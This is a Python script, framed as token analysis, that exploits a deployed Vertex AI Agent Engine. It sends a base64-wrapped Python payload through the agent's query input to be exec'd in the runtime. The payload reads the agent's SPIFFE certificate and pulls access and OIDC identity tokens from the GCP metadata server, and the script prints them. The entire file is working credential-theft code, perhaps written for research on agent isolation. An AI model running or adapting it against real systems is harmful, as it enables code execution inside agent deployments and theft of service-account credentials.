"""
Analyze a cert-bound GCP access token from a deployed Vertex AI Agent Engine.

Agent identity credentials use the GCP Compute Engine metadata server
(http://metadata.google.internal/...) rather than STS. The returned token is
certificate-bound: the metadata server binds it to the fingerprint of the
agent's current SPIFFE leaf certificate.

Analysis steps:
  1. Query the deployed agent to read its metadata server token.
  2. Extract the SPIFFE identity and certificate fingerprint for inspection.
  3. Optionally call the tokeninfo endpoint to decode scopes, expiry, and claims.

Usage:
    python get_token.py --agent <resource_name> [--inspect]

Example:
    python get_token.py \\
        --agent projects/158296564676/locations/us-central1/reasoningEngines/4310086130637733888 \\
        --inspect
"""

import argparse
import base64
import json
import os
import sys
import vertexai

# Reads the SPIFFE leaf certificate and returns its metadata as JSON.
_ANALYZE_CERT_SCRIPT = b"""
import sys, base64, hashlib, json
sys.path.insert(0, '/code/.venv/lib/python3.13/site-packages')
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.serialization import Encoding

CERT_PATH = '/var/run/secrets/workload-spiffe-credentials/certificates.pem'

with open(CERT_PATH, 'rb') as f:
    pem = f.read().decode()

blocks = [('-----BEGIN CERTIFICATE-----' + c).encode()
          for c in pem.split('-----BEGIN CERTIFICATE-----')
          if '-----END CERTIFICATE-----' in c]
leaf = x509.load_pem_x509_certificate(blocks[0], default_backend())

der = leaf.public_bytes(Encoding.DER)
fp  = base64.b64encode(hashlib.sha256(der).digest()).decode().rstrip('=')

san       = leaf.extensions.get_extension_for_class(x509.SubjectAlternativeName)
uris      = san.value.get_values_for_type(x509.UniformResourceIdentifier)
dns_names = san.value.get_values_for_type(x509.DNSName)
spiffe    = next((u for u in uris if u.startswith('spiffe://')), None)

print(json.dumps({
    'fingerprint_sha256': fp,
    'spiffe_uri':         spiffe,
    'subject':            leaf.subject.rfc4514_string(),
    'issuer':             leaf.issuer.rfc4514_string(),
    'not_before':         leaf.not_valid_before_utc.isoformat(),
    'not_after':          leaf.not_valid_after_utc.isoformat(),
    'serial':             hex(leaf.serial_number),
    'san_uris':           list(uris),
    'san_dns':            list(dns_names),
}))
"""

# Fetches an OIDC identity token from the GCP metadata server for a given audience.
# Audience is injected at runtime via .format() before encoding.
_FETCH_ID_TOKEN_SCRIPT_TMPL = """
import json, urllib.request

url = ('http://metadata.google.internal/computeMetadata/v1/instance/'
       'service-accounts/default/identity'
       '?audience={audience}&format=full')
req = urllib.request.Request(url, headers={{'Metadata-Flavor': 'Google'}})
jwt = urllib.request.urlopen(req).read().decode().strip()
print(json.dumps({{'id_token': jwt}}))
"""

# Fetches an access token from the GCP metadata server.
# Scopes are injected at runtime via .format() before encoding.
_FETCH_TOKEN_SCRIPT_TMPL = """
import json, urllib.request, urllib.parse

scopes = {scopes!r}
url = ('http://metadata.google.internal/computeMetadata/v1/instance/'
       'service-accounts/default/token'
       + ('?scopes=' + urllib.parse.quote(','.join(scopes), safe='') if scopes else ''))
req = urllib.request.Request(url, headers={{'Metadata-Flavor': 'Google'}})
tok = json.loads(urllib.request.urlopen(req).read())

print(json.dumps({{
    'access_token': tok['access_token'],
    'token_type':   tok.get('token_type', 'Bearer'),
    'expires_in':   tok.get('expires_in'),
}}))
"""


def _run_script(agent, script: bytes) -> dict:
    b64 = base64.b64encode(script).decode()
    cmd = (f"exec echo {b64} | "
           f"/code/.venv/bin/python3 -c "
           f"'import sys,base64; exec(base64.b64decode(sys.stdin.read().strip()).decode())'")
    raw = agent.query(input=cmd)
    for line in raw.splitlines():
        line = line.strip()
        if line.startswith("{"):
            return json.loads(line)
    raise RuntimeError(f"Unexpected agent output:\n{raw}")


def decode_jwt(token: str) -> tuple[dict, dict]:
    """Decode a JWT without verifying the signature. Returns (header, payload)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Not a valid JWT: expected 3 parts, got {len(parts)}")

    def _b64decode(s: str) -> dict:
        # Re-pad to multiple of 4
        s += "=" * (-len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s))

    return _b64decode(parts[0]), _b64decode(parts[1])


def fetch_access_token(resource_name: str, project: str, region: str, scopes: list[str] | None = None, base_url: str | None = None) -> dict:
    from google.genai.types import HttpOptions
    script = _FETCH_TOKEN_SCRIPT_TMPL.format(scopes=scopes or []).encode()
    kwargs: dict = {"project": project, "location": region}
    if base_url:
        kwargs["http_options"] = HttpOptions(baseUrl=base_url)
    client = vertexai.Client(**kwargs)
    agent = client.agent_engines.get(name=resource_name)
    return _run_script(agent, script)


def fetch_id_token(resource_name: str, project: str, region: str, audience: str, base_url: str | None = None) -> str:
    from google.genai.types import HttpOptions
    script = _FETCH_ID_TOKEN_SCRIPT_TMPL.format(audience=audience).encode()
    kwargs: dict = {"project": project, "location": region}
    if base_url:
        kwargs["http_options"] = HttpOptions(baseUrl=base_url)
    client = vertexai.Client(**kwargs)
    agent = client.agent_engines.get(name=resource_name)
    result = _run_script(agent, script)
    return result["id_token"]


def fetch_cert_and_token(resource_name: str, project: str, region: str, base_url: str | None = None) -> tuple[dict, dict]:
    from google.genai.types import HttpOptions
    kwargs: dict = {"project": project, "location": region}
    if base_url:
        kwargs["http_options"] = HttpOptions(baseUrl=base_url)
    client = vertexai.Client(**kwargs)
    agent = client.agent_engines.get(name=resource_name)
    cert  = _run_script(agent, _ANALYZE_CERT_SCRIPT)
    token = _run_script(agent, _FETCH_TOKEN_SCRIPT_TMPL.format(scopes=[]).encode())
    return cert, token


def inspect_token(token: str) -> dict:
    import requests
    r = requests.get(
        "https://oauth2.googleapis.com/tokeninfo",
        params={"access_token": token},
    )
    return r.json()


def main():
    parser = argparse.ArgumentParser(description="Analyze a cert-bound GCP access token from an Agent Engine")
    parser.add_argument("--agent", required=True, help="Agent resource name (projects/.../reasoningEngines/...)")
    parser.add_argument("--project", default=os.environ.get("GOOGLE_CLOUD_PROJECT"), required=not os.environ.get("GOOGLE_CLOUD_PROJECT"), help="GCP project ID")
    parser.add_argument("--region", default=os.environ.get("GOOGLE_CLOUD_REGION"), required=not os.environ.get("GOOGLE_CLOUD_REGION"), help="GCP region")
    parser.add_argument("--base-url", default=None, help="Override Vertex AI API base URL")
    parser.add_argument("--inspect", action="store_true", help="Decode token claims via tokeninfo endpoint")
    parser.add_argument("--id-token", metavar="AUDIENCE", default=None,
                        help="Fetch an OIDC identity token bound to AUDIENCE and print it")
    args = parser.parse_args()

    print(f"[*] Connecting to agent: {args.agent}")

    if args.id_token:
        jwt = fetch_id_token(args.agent, args.project, args.region, args.id_token, base_url=args.base_url)
        header, payload = decode_jwt(jwt)
        print(f"\n[+] ID token:")
        print(f"      Audience:   {payload.get('aud')}")
        print(f"      Subject:    {payload.get('sub')}")
        print(f"      Email:      {payload.get('email')}")
        print(f"      Issuer:     {payload.get('iss')}")
        print(f"      Issued at:  {payload.get('iat')}")
        print(f"      Expires:    {payload.get('exp')}")
        print(f"\n[+] Header:  {json.dumps(header)}")
        print(f"[+] Payload: {json.dumps(payload, indent=2)}")
        print(f"\n[+] Raw JWT:\n{jwt}")
        return

    cert, token = fetch_cert_and_token(args.agent, args.project, args.region, base_url=args.base_url)

    print(f"\n[+] Certificate:")
    print(f"      SPIFFE URI:  {cert['spiffe_uri']}")
    print(f"      Subject:     {cert['subject']}")
    print(f"      Issuer:      {cert['issuer']}")
    print(f"      Serial:      {cert['serial']}")
    print(f"      Not before:  {cert['not_before']}")
    print(f"      Not after:   {cert['not_after']}")
    print(f"      Fingerprint: {cert['fingerprint_sha256']} (SHA-256)")
    if cert["san_uris"]:
        print(f"      SAN URIs:    {', '.join(cert['san_uris'])}")
    if cert["san_dns"]:
        print(f"      SAN DNS:     {', '.join(cert['san_dns'])}")

    print(f"\n[+] Token type:   {token['token_type']}")
    print(f"[+] Expires in:   {token.get('expires_in')} seconds")
    print(f"[+] Access token (first 40 chars): {token['access_token'][:40]}...")

    if args.inspect:
        print("\n[*] Token info (tokeninfo endpoint):")
        info = inspect_token(token["access_token"])
        for k, v in info.items():
            print(f"  {k}: {v}")


if __name__ == "__main__":
    main()
